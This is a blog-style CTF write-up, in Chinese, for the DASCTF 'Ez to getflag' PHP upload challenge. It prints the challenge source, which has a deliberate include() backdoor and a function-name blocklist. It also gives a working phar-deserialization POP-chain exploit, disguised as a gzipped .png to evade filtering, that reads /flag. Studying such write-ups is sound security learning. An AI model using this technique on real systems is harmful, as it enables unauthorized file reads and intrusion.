@@ -1,0 +1,191 @@
+---
+title: DASCTF 2022 7月附能赛 writeup
+date: 2022-03-26 23:06:00
+updated: 2022-03-26 23:06:00
+tags: [ctf,security]
+---
+目前水平确实不足，下午看了几个小时的题目只出了一道web签到题，感觉这DAS的比赛纯粹为了CTF而出题，就像Ez to getflag这个题目，作为一个用户来说上传了一个1.png然后输入1.png查询查不到的话，这应该很难认为是个能用的web服务，纯ctf技巧题吧，比赛时候也做了非常久。
+
+## Ez to getflag
+
+一个文件上传的简单功能，总共俩接口 一个上传一个查询。
+在接口/upload.php 的响应头中发现PHP/7.4.11。
+查询接口有WAF 不能用`..`，但是可以读取源码。
+
+源码
+upload.php
+
+```php
+<?php
+    error_reporting(0);
+    session_start();
+    require_once('class.php');
+    $upload = new Upload();
+    $upload->uploadfile();
+?>
+```
+
+file.php
+
+```php
+<?php
+    error_reporting(0);
+    session_start();
+    require_once('class.php');
+    $filename = $_GET['f'];
+    $show = new Show($filename);
+    $show->show();
+?>
+```
+
+class.php
+
+```php
+<?php
+    class Upload {
+        public $f;
+        public $fname;
+        public $fsize;
+        function __construct(){
+            $this->f = $_FILES;
+        }
+        function savefile() {  
+            $fname = md5($this->f["file"]["name"]).".png";
+            if(file_exists('./upload/'.$fname)) {
+                @unlink('./upload/'.$fname);
+            }
+            move_uploaded_file($this->f["file"]["tmp_name"],"upload/" . $fname);
+            echo "upload success! :D";
+        }
+        function __toString(){
+            $cont = $this->fname;
+            $size = $this->fsize;
+            echo $cont->$size;
+            return 'this_is_upload';
+        }
+        function uploadfile() {
+            if($this->file_check()) {
+                $this->savefile();
+            }
+        }
+        function file_check() {
+            $allowed_types = array("png");
+            $temp = explode(".",$this->f["file"]["name"]);
+            $extension = end($temp);
+            if(empty($extension)) {
+                echo "what are you uploaded? :0";
+                return false;
+            }
+            else{
+                if(in_array($extension,$allowed_types)) {
+                    $filter = '/<\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i';
+                    $f = file_get_contents($this->f["file"]["tmp_name"]);
+                    if(preg_match_all($filter,$f)){
+                        echo 'what are you doing!! :C';
+                        return false;
+                    }
+                    return true;
+                }
+                else {
+                    echo 'png onlyyy! XP';
+                    return false;
+                }
+            }
+        }
+    }
+    class Show{
+        public $source;
+        public function __construct($fname)
+        {
+            $this->source = $fname;
+        }
+        public function show()
+        {
+            if(preg_match('/http|https|file:|php:|gopher|dict|\.\./i',$this->source)) {
+                die('illegal fname :P');
+            } else {
+                echo file_get_contents($this->source);
+                $src = "data:jpg;base64,".base64_encode(file_get_contents($this->source));
+                echo "<img src={$src} />";
+            }
+
+        }
+        function __get($name)
+        {
+            $this->ok($name);
+        }
+public function__call($name, $arguments)
+        {
+            if(end($arguments)=='phpinfo'){
+                phpinfo();
+            }else{
+                $this->backdoor(end($arguments));
+            }
+            return $name;
+        }
+        public function backdoor($door){
+            include($door);
+            echo "hacked!!";
+        }
+        public function __wakeup()
+        {
+            if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
+                die("illegal fname XD");
+            }
+        }
+    }
+    class Test{
+        public $str;
+public function__construct(){
+            $this->str="It's works";
+        }
+        public function __destruct()
+        {
+            echo $this->str;
+        }
+    }
+?>
+```
+
+由于show方法中file_get_contents()函数参数可控，我们可以通过phar伪协议来读取我们上传的phar格式的文件。这里我们通过构造POP链，通过反序列化控制`include($door)`中的参数，从而通过`include`函数包含`/flag`文件，来读取flag。
+
+EXP:
+
+```php
+<?php include('class.php');
+
+
+$t = new Test();
+$t->str = new Upload();
+$t->str->fname = new Show('1.png');
+$t->str->fsize = '/flag';
+// $poc = serialize($t);
+
+$phar = new Phar('poc.phar');
+$phar->stopBuffering();
+$phar->setStub('GIF89a' . '<?php __HALT_COMPILER();?>');
+$phar->addFromString('test.txt', 'test');
+$phar->setMetadata($t);
+$phar->stopBuffering();
+
+// print($poc);
+```
+
+生成poc.phar文件
+
+```bash
+gzip poc.phar
+```
+
+使用gzip压缩来绕过对文件内容的检测，得到poc.phar.gz,改名为poc.png。
+
+由于是采用文件名的md5值的方式，读取phar://./upload/ba48d64c6886e802cd5f65e99e8566ee.png即可。
+![图 1](https://s2.loli.net/2022/07/24/k6PNqflvVX4xmSz.png)  
+
+一些值得反思的地方：
+1.为什么要用phar伪协议？因为题目不管你上传什么，都会给你的命名为md5.png,这样的话你虽然可以想办法传一个内容是png的php文件，比如说用`test.php%00.png`来绕过，这完全可以，但是却没办法当成php文件去执行。所以我们只能选择上传一个phar内容的文件，因为phar格式的文件即便是后缀被修改了，使用phar://这个伪协议读取，还是会按照phar的内容来解析的，甚至是用gzip压缩phar文件，修改后缀上传，也会自动解压一层并且按照phar内容来解析。
+
+2.有没有办法实现RCE？这里只做到了任意文件读取，读取到了flag,有没有可能控制include的函数的参数为data伪协议或者file伪协议，来让include函数包含远程文件，从而实现RCE呢？题目中如果$door接收到参数为phpinfo，那么就会直接执行phpinfo()；借此我们可以查看环境变量中`allow_url_fopen = on` 和 `allow_url_include = off`，前者用于file_get_content，而后者用于`include`,因此我们没有办法通过控制include函数的参数来包含远程的文件。
+
+复盘题目的过程中，在phpinfo中甚至可以找到从环境变量里面读进来的flag？？就离谱
+![图 2](https://s2.loli.net/2022/07/24/uXbpDEMWyP7UhvC.png)  
